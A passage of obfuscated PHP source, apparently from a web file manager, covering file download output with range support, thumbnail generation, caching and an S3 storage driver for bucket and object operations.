(isset($_SERVER[$şº…Ú¢°[147]]) && $_SERVER[$şº…Ú¢°[147]] == $Ä“ïõğá) { header($şº…Ú¢°[148] . $Ä“ïõğá, !0, 304); die; } header($şº…Ú¢°[148] . $Ä“ïõğá); header($şº…Ú¢°[149] . $Éâèıö . $şº…Ú¢°[141]); header($şº…Ú¢°[150] . $Í¯”µ«†); header($şº…Ú¢°[151]); header($şº…Ú¢°[152] . $ä¾¯Àğõ); header($şº…Ú¢°[153]); Hook::trigger($şº…Ú¢°[154], $óÇ®éÜ, $ä¾¯Àğõ, $Í¯”µ«†, $ªÂğùÃû); if (!$­©ŞĞµ¦ && $ªÂğùÃû == $şº…Ú¢°[155]) { if ($ä¾¯Àğõ > 1024 * 1024 * 5) { die; } $ÁÜœÇ¥Ÿ = $this->getContent($óÇ®éÜ); $ÁÜœÇ¥Ÿ = Html::clearSVG($ÁÜœÇ¥Ÿ); header($şº…Ú¢°[156] . strlen($ÁÜœÇ¥Ÿ)); echo $ÁÜœÇ¥Ÿ; die; } $¥ş’ÂÓ¡ = strtolower($_SERVER[$şº…Ú¢°[157]]); if ($åŸÕã›² && $¥ş’ÂÓ¡ && $²¡Î³Ö) { if (strstr($¥ş’ÂÓ¡, $şº…Ú¢°[158])) { header($şº…Ú¢°[159] . $óÇ®éÜ); } else { if (strstr($¥ş’ÂÓ¡, $şº…Ú¢°[160])) { header($şº…Ú¢°[161] . $óÇ®éÜ); } else { if (strstr($¥ş’ÂÓ¡, $şº…Ú¢°[162])) { header($şº…Ú¢°[163] . $óÇ®éÜ); } } } if ($ãÜò‡ë¸) { header($şº…Ú¢°[164] . $ãÜò‡ë¸); } return; } if (isset($_SERVER[$şº…Ú¢°[165]])) { if (preg_match($şº…Ú¢°[166], $_SERVER[$şº…Ú¢°[165]], $À·È›Ëƒ)) { $óÇ™ÄĞŞ = intval($À·È›Ëƒ[1]); $óÇ™ÄĞŞ = $óÇ™ÄĞŞ <= 0 ? 0 : ($óÇ™ÄĞŞ >= $¥ş…›¿ ? $¥ş…›¿ : $óÇ™ÄĞŞ); if (!empty($À·È›Ëƒ[2])) { $Ã©èŞ”È = intval($À·È›Ëƒ[2]); $¥ş…›¿ = $Ã©èŞ”È < $óÇ™ÄĞŞ ? $óÇ™ÄĞŞ : ($Ã©èŞ”È >= $¥ş…›¿ ? $¥ş…›¿ : $Ã©èŞ”È); } } header($şº…Ú¢°[167]); header("\103\157\x6e\164\145\x6e\164\55\x52\141\156\147\x65\72\40\142\x79\164\x65\x73\x20{$óÇ™ÄĞŞ}\55{$¥ş…›¿}\57" . $ä¾¯Àğõ); } else { header($şº…Ú¢°[168]); } header($şº…Ú¢°[169]); $²¥•éØï = !0; if ($_SERVER[$şº…Ú¢°[170]] == $şº…Ú¢°[171] && $ä¾¯Àğõ > 1204 * 1024 * 1024 * 2) { $²¥•éØï = !1; } if ($²¥•éØï) { header($şº…Ú¢°[172] . ($¥ş…›¿ - $óÇ™ÄĞŞ + 1)); } if ($_SERVER[$şº…Ú¢°[173]] == $şº…Ú¢°[174]) { return; } $ò¡Ã´ü = 1024 * 100; $¡éú¼¥ = 0; if ($ãÜò‡ë¸) { $¡éú¼¥ = intval(1000 * 1000 * ($ò¡Ã´ü / $ãÜò‡ë¸)); } while ($óÇ™ÄĞŞ <= $¥ş…›¿) { $ÂúÒ•ŠÒ = timeFloat(); check_abort(); $Ô´ïº“ = $¥ş…›¿ - $óÇ™ÄĞŞ + 1; if ($Ô´ïº“ <= $ò¡Ã´ü) { $ò¡Ã´ü = $Ô´ïº“; } echo $this->fileSubstr($óÇ®éÜ, $óÇ™ÄĞŞ, $ò¡Ã´ü); $óÇ™ÄĞŞ += $ò¡Ã´ü; if ($ò¡Ã´ü == $Ô´ïº“) { $óÇ™ÄĞŞ = $¥ş…›¿ + 1; } if ($¡éú¼¥) { $Š‚êã‡ = intval(1000 * 1000 * (timeFloat() - $ÂúÒ•ŠÒ)); $¥ò«Ó©¢ = $¡éú¼¥ - $Š‚êã‡; if ($¥ò«Ó©¢ > 5) { usleep($¥ò«Ó©¢); } } } } public function fileOutServer($ŸÀÁŸ÷¨, $ê¶®àÏÀ = false, $„ÈñéÚù = false, $ò‘æñ‰ = '') { $this->fileOut($ŸÀÁŸ÷¨, $ê¶®àÏÀ, $„ÈñéÚù, $ò‘æñ‰); } public function fileOutLink($ŠÂö·€É) { header($_SERVER[Õò”†—·][175] . $ŠÂö·€É); die; } public function cacheMethod($¾ˆŞÔÈø, $”–æ²ŒÉ, $ç¢´üĞœ = null) { $ÚÂ…¡è =& $_SERVER[Õò”†—·]; static $âÚ¢Ñ¼‚ = array(); $Ÿƒí÷ˆİ = $”–æ²ŒÉ ? ltrim($this->getPathOuter($”–æ²ŒÉ), $ÚÂ…¡è[18]) : $ÚÂ…¡è[22]; $Å•ŞúÀ¦ = $ÚÂ…¡è[176] . $¾ˆŞÔÈø . $ÚÂ…¡è[177] . rtrim($Ÿƒí÷ˆİ, $ÚÂ…¡è[18]); if (is_null($¾ˆŞÔÈø)) { $âÚ¢Ñ¼‚ = array(); return; } if (is_null($”–æ²ŒÉ)) { foreach ($âÚ¢Ñ¼‚ as $Å•ŞúÀ¦ => $ù¢²ˆœ) { if (!strstr($Å•ŞúÀ¦, $ÚÂ…¡è[176] . $¾ˆŞÔÈø . $ÚÂ…¡è[178])) { continue; } unset($âÚ¢Ñ¼‚[$Å•ŞúÀ¦]); } return; } if (!is_null($ç¢´üĞœ)) { $âÚ¢Ñ¼‚[$Å•ŞúÀ¦] = $ç¢´üĞœ; return; } $¦²²„Ÿì = isset($âÚ¢Ñ¼‚[$Å•ŞúÀ¦]) ? $âÚ¢Ñ¼‚[$Å•ŞúÀ¦] : null; if (!is_null($¦²²„Ÿì)) { return $¦²²„Ÿì; } $¦²²„Ÿì = $this->{$¾ˆŞÔÈø}($”–æ²ŒÉ); $âÚ¢Ñ¼‚[$Å•ŞúÀ¦] = $¦²²„Ÿì; return $¦²²„Ÿì; } public function cacheMethodInfoSet($‹‡õåæˆ, $•ÁÉõçÆ, $ÀÇ€ºå = false) { $£¿Àê  =& $_SERVER[Õò”†—·]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($£¿Àê [179], $‹‡õåæˆ, $•ÁÉõçÆ); $this->cacheMethod($£¿Àê [180], $‹‡õåæˆ, $•ÁÉõçÆ ? !1 : !0); if (is_array($ÀÇ€ºå)) { $this->cacheMethod($£¿Àê [181], $‹‡õåæˆ, $ÀÇ€ºå); } } public function fileOutImage($ÖëÌ¢ïì, $Ä®‚ÛÆÆ = 250) { $–’¨ìè¯ =& $_SERVER[Õò”†—·]; set_timeout(); if (substr($ÖëÌ¢ïì, 0, 4) == $–’¨ìè¯[162]) { $this->fileOutLink($ÖëÌ¢ïì); } $Áºì¯ = $this->info($ÖëÌ¢ïì); $äğ¡Ú‡ = !1; $ÔŸ“İö­ = isset($GLOBALS[$–’¨ìè¯[182]]) ? $GLOBALS[$–’¨ìè¯[182]] : array(); if ($ÔŸ“İö­ && $ÔŸ“İö­[$–’¨ìè¯[183]] == $Áºì¯[$–’¨ìè¯[97]]) { $Áºì¯ = $ÔŸ“İö­; $¹ş‡¦Ì = $Áºì¯[$–’¨ìè¯[184]]; if ($¹ş‡¦Ì && isset($¹ş‡¦Ì[$–’¨ìè¯[185]])) { if ($¹ş‡¦Ì[$–’¨ìè¯[185]] <= $Ä®‚ÛÆÆ && $¹ş‡¦Ì[$–’¨ìè¯[186]] <= $Ä®‚ÛÆÆ) { $äğ¡Ú‡ = !0; } } } if ($Áºì¯[$–’¨ìè¯[89]] <= 1024 * 50 || $äğ¡Ú‡ || !function_exists($–’¨ìè¯[187]) || $Áºì¯[$–’¨ìè¯[188]] == $–’¨ìè¯[189]) { return $this->fileOut($ÖëÌ¢ïì, !1, $Áºì¯[$–’¨ìè¯[42]]); } $¬½’Èà„ = kodIO::hashPath($Áºì¯); $à¬§†”Ä = "\x63\157\x76\x65\x72\137{$¬½’Èà„}\137{$Ä®‚ÛÆÆ}\56\160\x6e\x67"; $ÂÍ›ÙÚ‹ = IO_PATH_SYSTEM_TEMP . $–’¨ìè¯[190]; $Òı·Ú¤Œ = IO::infoFullSimple($ÂÍ›ÙÚ‹); $™÷ø…İÀ = $Òı·Ú¤Œ && is_array($Òı·Ú¤Œ) ? $Òı·Ú¤Œ[$–’¨ìè¯[97]] : $–’¨ìè¯[22]; if (!$™÷ø…İÀ) { $™÷ø…İÀ = IO::mkdir($ÂÍ›ÙÚ‹); } if ($Áºì¯[$–’¨ìè¯[191]] == $–’¨ìè¯[192] && isset($Áºì¯[$–’¨ìè¯[193]]) && $Áºì¯[$–’¨ìè¯[193]] == kodIO::sourceID($™÷ø…İÀ)) { $±ïÆ±™ = $Áºì¯[$–’¨ìè¯[194]]; if ($Ä®‚ÛÆÆ <= 500) { $¢®ğÂ€ = preg_replace($–’¨ìè¯[195], $–’¨ìè¯[196], $Áºì¯[$–’¨ìè¯[42]]); $±ïÆ±™ = IO::fileNameExist($™÷ø…İÀ, $¢®ğÂ€); } return IO::fileOut(KodIO::make($±ïÆ±™), !1, $Áºì¯[$–’¨ìè¯[42]]); } $ÆËÛ¤Û = IO::fileNameExist($™÷ø…İÀ, $à¬§†”Ä); if ($ÆËÛ¤Û) { return IO::fileOut(KodIO::make($ÆËÛ¤Û), !1, $Áºì¯[$–’¨ìè¯[42]]); } if ($Ä®‚ÛÆÆ > 1000) { $this->makeImageCover($™÷ø…İÀ, $ÖëÌ¢ïì, $à¬§†”Ä, $Ä®‚ÛÆÆ); $this->makeImageCover($™÷ø…İÀ, $ÖëÌ¢ïì, "\x63\x6f\166\145\162\137{$¬½’Èà„}\x5f\x32\x35\60\x2e\x70\156\x67", 250); $ÆËÛ¤Û = IO::fileNameExist($™÷ø…İÀ, $à¬§†”Ä); if ($ÆËÛ¤Û) { return IO::fileOut(KodIO::make($ÆËÛ¤Û), !1, $Áºì¯[$–’¨ìè¯[42]]); } die; } $ıà­º±¥ = Cache::get($à¬§†”Ä); if ($ıà­º±¥ == $–’¨ìè¯[197] || $ıà­º±¥ == $–’¨ìè¯[198]) { echo $ıà­º±¥; die; } Cache::set($à¬§†”Ä, $–’¨ìè¯[198], 60); $µå¬¿€ú = array($™÷ø…İÀ, $Áºì¯[$–’¨ìè¯[97]], $à¬§†”Ä, $Ä®‚ÛÆÆ); $Ò›¦î½Ò = $–’¨ìè¯[199] . $Áºì¯[$–’¨ìè¯[89]] . $–’¨ìè¯[200] . $à¬§†”Ä . $–’¨ìè¯[201] . $Áºì¯[$–’¨ìè¯[42]] . $–’¨ìè¯[202] . $Áºì¯[$–’¨ìè¯[97]]; TaskQueue::add($–’¨ìè¯[203], $µå¬¿€ú, $Ò›¦î½Ò, $à¬§†”Ä); } public function makeImageCover($¡œğ÷š’, $ÏºØ³æ , $ë¯Ş‘¬Ø, $¦¯‰Ş˜) { $ºÊóã‚” =& $_SERVER[Õò”†—·]; if (IO::fileNameExist($¡œğ÷š’, $ë¯Ş‘¬Ø)) { return $ºÊóã‚”[204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $åçÈ‰—¡ = DATA_THUMB . $ë¯Ş‘¬Ø; del_file($åçÈ‰—¡); $şäáêóä = TEMP_FILES . $ë¯Ş‘¬Ø; if (!@file_exists($şäáêóä)) { $şäáêóä = $this->download($ÏºØ³æ , $şäáêóä); } if (!@file_exists($şäáêóä)) { return $ºÊóã‚”[205]; } ImageThumb::createThumb($şäáêóä, $åçÈ‰—¡, $¦¯‰Ş˜, $¦¯‰Ş˜ * 10); if (@file_exists($åçÈ‰—¡)) { Cache::remove($ë¯Ş‘¬Ø); return IO::move($åçÈ‰—¡, $¡œğ÷š’); } Cache::set($ë¯Ş‘¬Ø, $ºÊóã‚”[197], 600); del_file($åçÈ‰—¡); return $ºÊóã‚”[206] . $şäáêóä . $ºÊóã‚”[84]; } public function fileOutImageServer($ã’î—×, $»”ûÚè = 250) { $this->fileOutImage($ã’î—×, $»”ûÚè); } public function fileNameAuto($¸°ù×ğ, $¬¹€‡‡¹, $é®«…Ãµ = REPEAT_RENAME, $½Ùé™Ô– = false) { $‰÷¸ïı™ =& $_SERVER[Õò”†—·]; $ˆ÷…íÎÙ = $¸°ù×ğ === $‰÷¸ïı™[22] ? $¬¹€‡‡¹ : rtrim($¸°ù×ğ, $‰÷¸ïı™[18]) . $‰÷¸ïı™[18] . $¬¹€‡‡¹; if ($é®«…Ãµ == REPEAT_REPLACE || !$this->exist($ˆ÷…íÎÙ) || $½Ùé™Ô– && $é®«…Ãµ != REPEAT_RENAME_FOLDER) { return $¬¹€‡‡¹; } if ($é®«…Ãµ == REPEAT_SKIP) { return !1; } $¤ëê¢½â = $‰÷¸ïı™[20] . get_path_ext($¬¹€‡‡¹); $¤ëê¢½â = $¤ëê¢½â == $‰÷¸ïı™[20] || $½Ùé™Ô– ? $‰÷¸ïı™[22] : $¤ëê¢½â; $¡¢ÏÃğ = 1; $½ÃÒ¾­³ = substr($¬¹€‡‡¹, 0, strlen($¬¹€‡‡¹) - strlen($¤ëê¢½â)); $«‡Ÿú³ò = $½ÃÒ¾­³ . "\x28{$¡¢ÏÃğ}\x29{$¤ëê¢½â}"; while ($this->exist(rtrim($¸°ù×ğ, $‰÷¸ïı™[18]) . $‰÷¸ïı™[18] . $«‡Ÿú³ò)) { $«‡Ÿú³ò = $½ÃÒ¾­³ . "\x28{$¡¢ÏÃğ}\51{$¤ëê¢½â}"; $¡¢ÏÃğ++; } return $«‡Ÿú³ò; } private function fileNameAutoList($ÓùÈÒÀ, $ºÕÒª½¡, $ƒ¿ÆšÁ = false) { $²ÄöñÕ =& $_SERVER[Õò”†—·]; $€øíÚ”¦ = $this->listPath($ÓùÈÒÀ, !0); $€øíÚ”¦ = array_merge($€øíÚ”¦[$²ÄöñÕ[95]], $€øíÚ”¦[$²ÄöñÕ[96]]); $·‹Îµîñ = array_to_keyvalue($€øíÚ”¦, $²ÄöñÕ[22], $²ÄöñÕ[42]); $‡±óê×û = $²ÄöñÕ[20] . get_path_ext($ºÕÒª½¡); $‡±óê×û = $‡±óê×û == $²ÄöñÕ[20] || $ƒ¿ÆšÁ ? $²ÄöñÕ[22] : $‡±óê×û; $å†‰ñ÷ = substr($ºÕÒª½¡, 0, strlen($ºÕÒª½¡) - strlen($‡±óê×û)); $µÕ³öù = $å†‰ñ÷ . "\x28\x30\x29{$‡±óê×û}"; for ($èÃ°íŸ— = 1; $èÃ°íŸ— <= count($·‹Îµîñ) + 1; $èÃ°íŸ—++) { $µÕ³öù = $å†‰ñ÷ . "\x28{$èÃ°íŸ—}\x29{$‡±óê×û}"; if (!in_array_not_case($µÕ³öù, $·‹Îµîñ)) { return $µÕ³öù; } } return $µÕ³öù; } public function listAllFiles($àìøğŠ, $Á¬¦¦Ÿ) { $ÑâÔ¦ÏÁ =& $_SERVER[Õò”†—·]; if (empty($Á¬¦¦Ÿ)) { return array(); } $¥¡“úãå = array_keys($Á¬¦¦Ÿ); $ÇÎòÔ¨Œ = array(); $àìøğŠ = trim($àìøğŠ, $ÑâÔ¦ÏÁ[18]); foreach ($Á¬¦¦Ÿ as $ŸåãÖ¢ì => $³†ºŠ÷) { $®â‡ø¥À = ltrim(substr(trim($ŸåãÖ¢ì, $ÑâÔ¦ÏÁ[18]), strlen($àìøğŠ)), $ÑâÔ¦ÏÁ[18]); if (substr($ŸåãÖ¢ì, -1) == $ÑâÔ¦ÏÁ[18]) { $®â‡ø¥À = rtrim($®â‡ø¥À, $ÑâÔ¦ÏÁ[18]) . $ÑâÔ¦ÏÁ[18]; } $ÇÎòÔ¨Œ = array_merge($ÇÎòÔ¨Œ, $this->slicePath($®â‡ø¥À)); } $‹÷³¶Å€ = array(); foreach (array_unique($ÇÎòÔ¨Œ) as $ê¸è§Ì) { $¸¤ÂïÃœ = array($ÑâÔ¦ÏÁ[97] => $this->getPathOuter($ÑâÔ¦ÏÁ[18] . $àìøğŠ . $ÑâÔ¦ÏÁ[18] . $ê¸è§Ì), $ÑâÔ¦ÏÁ[88] => 1, $ÑâÔ¦ÏÁ[89] => 0); if (substr($ê¸è§Ì, -1) != $ÑâÔ¦ÏÁ[18]) { $¸¤ÂïÃœ[$ÑâÔ¦ÏÁ[88]] = 0; $‡‹ÓÑş = $this->getPath($àìøğŠ . $ÑâÔ¦ÏÁ[18] . $ê¸è§Ì); if (isset($Á¬¦¦Ÿ[$‡‹ÓÑş])) { $½İï„¡Õ = $Á¬¦¦Ÿ[$‡‹ÓÑş]; if (isset($½İï„¡Õ[$ÑâÔ¦ÏÁ[89]])) { $¸¤ÂïÃœ[$ÑâÔ¦ÏÁ[89]] = intval($½İï„¡Õ[$ÑâÔ¦ÏÁ[89]]); } if (isset($½İï„¡Õ[$ÑâÔ¦ÏÁ[207]])) { $¸¤ÂïÃœ[$ÑâÔ¦ÏÁ[98]] = intval($½İï„¡Õ[$ÑâÔ¦ÏÁ[207]]); } } } $‹÷³¶Å€[] = $¸¤ÂïÃœ; } return $‹÷³¶Å€; } public function slicePath($Æ°æŞ‰ù) { $úÜ„Á†Ü =& $_SERVER[Õò”†—·]; $¹“”²à = explode($úÜ„Á†Ü[18], trim($Æ°æŞ‰ù, $úÜ„Á†Ü[18])); $ºÛÊÁª¦ = 0; do { ++$ºÛÊÁª¦; $•º«è¼[] = implode($úÜ„Á†Ü[18], array_slice($¹“”²à, 0, $ºÛÊÁª¦)) . $úÜ„Á†Ü[18]; } while ($ºÛÊÁª¦ < count($¹“”²à)); $•º«è¼[count($¹“”²à) - 1] = $Æ°æŞ‰ù; return $•º«è¼; } public function getHost() { $ËíÃûª´ =& $_SERVER[Õò”†—·]; $İî¶©ş¼ = parse_url(trim($this->domain, $ËíÃûª´[18])); $êñÙÛ·¸ = isset($İî¶©ş¼[$ËíÃûª´[208]]) ? $İî¶©ş¼[$ËíÃûª´[208]] : http_type(); $Ó–ú òÉ = isset($İî¶©ş¼[$ËíÃûª´[209]]) ? $İî¶©ş¼[$ËíÃûª´[209]] : $İî¶©ş¼[$ËíÃûª´[97]]; if (isset($İî¶©ş¼[$ËíÃûª´[210]])) { $Ó–ú òÉ .= $ËíÃûª´[4] . $İî¶©ş¼[$ËíÃûª´[210]]; } return $êñÙÛ·¸ . $ËíÃûª´[211] . $Ó–ú òÉ; } public function pathEncode($¯ùşˆ½ã) { $ê‡ò¡£ƒ =& $_SERVER[Õò”†—·]; return str_replace($ê‡ò¡£ƒ[212], $ê‡ò¡£ƒ[18], rawurlencode($¯ùşˆ½ã)); } public function writeLog($•­÷ÚÓŒ = '', $×çÁë¬ = false) { $Ç¶Ó¬Ôâ =& $_SERVER[Õò”†—·]; $Ö®Ç£§¼ = in_array(ACTION, array($Ç¶Ó¬Ôâ[213], $Ç¶Ó¬Ôâ[214])); if (!$Ö®Ç£§¼ && !GLOBAL_DEBUG) { return; } $Ê¸ˆŞ²Á = $•­÷ÚÓŒ; static $ÖáØÖ¾µ = null; if (!$ÖáØÖ¾µ) { $ÖáØÖ¾µ = strtoupper($this->getType()); } $•­÷ÚÓŒ = $ÖáØÖ¾µ . $Ç¶Ó¬Ôâ[215] . $•­÷ÚÓŒ; if ($×çÁë¬) { $«®ë¼÷® = error_get_last(); if ($«®ë¼÷®) { $•­÷ÚÓŒ = array($•­÷ÚÓŒ, $«®ë¼÷®); } } write_log($•­÷ÚÓŒ, $Ç¶Ó¬Ôâ[216]); if ($Ö®Ç£§¼) { throw new Exception($Ê¸ˆŞ²Á); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($“ñªŒÚ¾) { set_timeout(); require_once SDK_DIR . $_SERVER[Õò”†—·][217]; parent::__construct(); $this->_init($“ñªŒÚ¾); } public function _init($»®¤«×) { $¼Ì¬æèä =& $_SERVER[Õò”†—·]; $this->config = $»®¤«×; foreach ($»®¤«× as $ˆ·½£ƒ => $Ÿäõíç„) { if (isset($this->{$ˆ·½£ƒ})) { $this->{$ˆ·½£ƒ} = $Ÿäõíç„; } } $this->endpoint = $»®¤«×[$¼Ì¬æèä[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($¼Ì¬æèä[213], $¼Ì¬æèä[214]))) { $this->client->setExceptions(); } } public function setSignVersion($âÕˆ„´Ä = "\x76\x34") { $this->signVer = $âÕˆ„´Ä; $this->client->setSignatureVersion($âÕˆ„´Ä); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $úĞ­’¦µ) { return null; } } public function isBucketCors() { $ÂÒãåä =& $_SERVER[Õò”†—·]; $ªÓ¡˜í÷ = $this->getBucketCors(); if (!$ªÓ¡˜í÷ || !is_array($ªÓ¡˜í÷)) { return !1; } if (!is_array($ªÓ¡˜í÷[$ÂÒãåä[219]])) { $ªÓ¡˜í÷[$ÂÒãåä[219]] = explode($ÂÒãåä[60], $ªÓ¡˜í÷[$ÂÒãåä[219]]); } if ($ªÓ¡˜í÷[$ÂÒãåä[220]] != $ÂÒãåä[221] || !in_array($ÂÒãåä[221], $ªÓ¡˜í÷[$ÂÒãåä[219]])) { return !1; } $Ê¯Û—ó£ = array_map($ÂÒãåä[222], $ªÓ¡˜í÷[$ÂÒãåä[223]]); if (!is_array($Ê¯Û—ó£)) { $Ê¯Û—ó£ = array(); } $‡îİÔÆ = array($ÂÒãåä[224], $ÂÒãåä[225], $ÂÒãåä[226], $ÂÒãåä[227], $ÂÒãåä[228]); $Öş­™ş = array_diff($‡îİÔÆ, $Ê¯Û—ó£); return empty($Öş­™ş); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($‚ ÊäÎÀ, $ˆ½ÑœéÓ = '', $Á¿¼îÂæ = REPEAT_RENAME) { $™Ë×ü‹ã = $this->setContent($‚ ÊäÎÀ, $ˆ½ÑœéÓ); if ($™Ë×ü‹ã !== !1) { return $this->getPathOuter($‚ ÊäÎÀ); } return !1; } public function mkdir($œ©›œ·…, $…¦¹ø¶Õ = REPEAT_SKIP) { $€ß¸èá =& $_SERVER[Õò”†—·]; if (empty($œ©›œ·…) && $œ©›œ·… !== $€ß¸èá[229]) { return !1; } if ($…¦¹ø¶Õ && $this->_isFolder($œ©›œ·…)) { return $this->getPathOuter($œ©›œ·…); } $Îã‹şø = $this->setContent($œ©›œ·…, $€ß¸èá[22], !0); if ($Îã‹şø !== !1) { return $this->getPathOuter($œ©›œ·…); } return !1; } public function copyFile($Ë °Æù¾, $éô•”ä, $¨ı…¢Öş = array()) { $•Üˆ¶¿ =& $_SERVER[Õò”†—·]; $££öîÈ¨ = $this->objectMeta($Ë °Æù¾); if (!$££öîÈ¨) { return !1; } if ($££öîÈ¨[$•Üˆ¶¿[89]] <= 1024 * 1024 * 200) { $ùëßÚÅ = $this->client->copyObject($this->bucket, $Ë °Æù¾, $this->bucket, $éô•”ä, $•Üˆ¶¿[230], $¨ı…¢Öş); } else { $ùëßÚÅ = $this->client->multiCopyObject($this->bucket, $Ë °Æù¾, $this->bucket, $éô•”ä, $¨ı…¢Öş); } $ùëßÚÅ = $ùëßÚÅ ? $this->getPathOuter($éô•”ä) : !1; return $ùëßÚÅ; } public function moveFile($»–ì¡š£, $¯»ŞëÌ˜) { if ($this->copyFile($»–ì¡š£, $¯»ŞëÌ˜)) { $this->delFile($»–ì¡š£); return $this->getPathOuter($¯»ŞëÌ˜); } return !1; } public function delFile($ŒÈ˜Ãğ´) { return $this->client->deleteObject($this->bucket, $ŒÈ˜Ãğ´); } public function delFolder($ç–Ûôúı) { $½§ì¬Œì =& $_SERVER[Õò”†—·]; if (!$this->exist($ç–Ûôúı)) { return !0; } $this->listItemCache = !1; $†ƒñŠğò = $this->fileList($ç–Ûôúı); $this->listItemCache = !0; $’ºŒĞ¥• = trim($ç–Ûôúı, $½§ì¬Œì[18]) . $½§ì¬Œì[18]; if (!empty($ç–Ûôúı) && $ç–Ûôúı !== $½§ì¬Œì[229] && !in_array($’ºŒĞ¥•, $†ƒñŠğò[$½§ì¬Œì[95]])) { $†ƒñŠğò[$½§ì¬Œì[95]][] = $’ºŒĞ¥•; } $ëÑâÂ¿¤ = $this->delByBatch($†ƒñŠğò[$½§ì¬Œì[96]]); if (!$ëÑâÂ¿¤) { return !1; } $ëÑâÂ¿¤ = $this->delByBatch($†ƒñŠğò[$½§ì¬Œì[95]]); if (!$ëÑâÂ¿¤) { return !1; } return $this->delFile($’ºŒĞ¥•); } private function delByBatch($²·ûİ¶) { foreach (array_chunk($²·ûİ¶, 1000) as $¦‹µ·Ì) { $•·í¢Ã = $this->client->deleteObjects($this->bucket, $¦‹µ·Ì); if (!$•·í¢Ã) { return !1; } } return !0; } public function rename($ÜÏêŒ¬ù, $©áÂæ­ª) { return $this->renameObject($ÜÏêŒ¬ù, $©áÂæ­ª); } public function listPath($èêÍ©’, $¥¹èµÔ = false) { $Şşóè¼§ =& $_SERVER[Õò”†—·]; $ê·ù´Ë = $this->fileList($èêÍ©’, $Şşóè¼§[18], !0); foreach ($ê·ù´Ë[$Şşóè¼§[95]] as $Ã°÷ŞŒ‰ => $‰÷Âï™À) { $ê·ù´Ë[$Şşóè¼§[95]][$Ã°÷ŞŒ‰] = $this->folderInfo($‰÷Âï™À, $¥¹èµÔ, $‰÷Âï™À); } foreach ($ê·ù´Ë[$Şşóè¼§[96]] as $Ã°÷ŞŒ‰ => $‰÷Âï™À) { $ê·ù´Ë[$Şşóè¼§[96]][$Ã°÷ŞŒ‰] = $this->fileInfo($‰÷Âï™À[$Şşóè¼§[42]], $¥¹èµÔ, $‰÷Âï™À); } return $ê·ù´Ë; } protected function infoChildren($Ú˜Ë„Ë, &$¾â—ù£Ä) { $±¹¼Î ³ =& $_SERVER[Õò”†—·]; $æ¿®šÕ = $this->fileList($Ú˜Ë„Ë, $±¹¼Î ³[22], !0); $¾â—ù£Ä[$±¹¼Î ³[91]] += count($æ¿®šÕ[$±¹¼Î ³[95]]); $¾â—ù£Ä[$±¹¼Î ³[90]] += count($æ¿®šÕ[$±¹¼Î ³[96]]); foreach ($æ¿®šÕ[$±¹¼Î ³[96]] as $Ï¥ç£ÈË) { if (!$Ï¥ç£ÈË || !$Ï¥ç£ÈË[$±¹¼Î ³[89]]) { continue; } $¾â—ù£Ä[$±¹¼Î ³[89]] += $Ï¥ç£ÈË[$±¹¼Î ³[89]]; } } private function fileInfo($«‘üğÉù, $ßİÄÆ¡ = false, $ù¢¢Ÿëå = array()) { $Ç£»Á™ =& $_SERVER[Õò”†—·]; $–“‡­ı’ = array($Ç£»Á™[42] => $this->pathThis($«‘üğÉù), $Ç£»Á™[97] => $this->getPathOuter($«‘üğÉù), $Ç£»Á™[43] => $Ç£»Á™[231], $Ç£»Á™[188] => $this->ext($«‘üğÉù), $Ç£»Á™[89] => isset($ù¢¢Ÿëå[$Ç£»Á™[89]]) ? $ù¢¢Ÿëå[$Ç£»Á™[89]] : 0); if ($ßİÄÆ¡) { return $–“‡­ı’; } $–“‡­ı’[$Ç£»Á™[232]] = $–“‡­ı’[$Ç£»Á™[98]] = 0; $–“‡­ı’[$Ç£»Á™[233]] = $–“‡­ı’[$Ç£»Á™[234]] = !0; if (empty($ù¢¢Ÿëå)) { $ù¢¢Ÿëå = $this->objectMeta($«‘üğÉù); if (!$ù¢¢Ÿëå) { return $–“‡­ı’; } } if (isset($ù¢¢Ÿëå[$Ç£»Á™[235]]) && $ù¢¢Ÿëå[$Ç£»Á™[235]]) { $–“‡­ı’[$Ç£»Á™[236]] = $ù¢¢Ÿëå[$Ç£»Á™[235]]; } if (isset($ù¢¢Ÿëå[$Ç£»Á™[207]])) { $–“‡­ı’[$Ç£»Á™[98]] = $ù¢¢Ÿëå[$Ç£»Á™[207]]; } if (isset($ù¢¢Ÿëå[$Ç£»Á™[89]])) { $–“‡­ı’[$Ç£»Á™[89]] = $ù¢¢Ÿëå[$Ç£»Á™[89]]; } return $–“‡­ı’; } private function folderInfo($¾×Ù×ßĞ, $ÂÏÍ¸€ç = false, $¦¼©Ò³Ç = array()) { $½îü¿ˆ =& $_SERVER[Õò”†—·]; $õåÎ¿÷ = array($½îü¿ˆ[42] => $this->pathThis($¾×Ù×ßĞ), $½îü¿ˆ[97] => $this->getPathOuter($½îü¿ˆ[18] . $¾×Ù×ßĞ), $½îü¿ˆ[43] => $½îü¿ˆ[88]); if ($ÂÏÍ¸€ç) { return $õåÎ¿÷; } $õåÎ¿÷[$½îü¿ˆ[232]] = $õåÎ¿÷[$½îü¿ˆ[98]] = 0; $õåÎ¿÷[$½îü¿ˆ[233]] = $õåÎ¿÷[$½îü¿ˆ[234]] = !0; if ($¾×Ù×ßĞ == $½îü¿ˆ[22]) { return $õåÎ¿÷; } if (empty($¦¼©Ò³Ç)) { $¦¼©Ò³Ç = $this->objectMeta(trim($¾×Ù×ßĞ, $½îü¿ˆ[18]) . $½îü¿ˆ[18]); } if (isset($¦¼©Ò³Ç[$½îü¿ˆ[207]])) { $õåÎ¿÷[$½îü¿ˆ[232]] = $¦¼©Ò³Ç[$½îü¿ˆ[207]]; } return $õåÎ¿÷; } private function fileList($†£õ°†, $Âª™Áé = '', $Óñ¨ò©ï = 0) { $øĞ³ï =& $_SERVER[Õò”†—·]; $©´ì£«Ø = 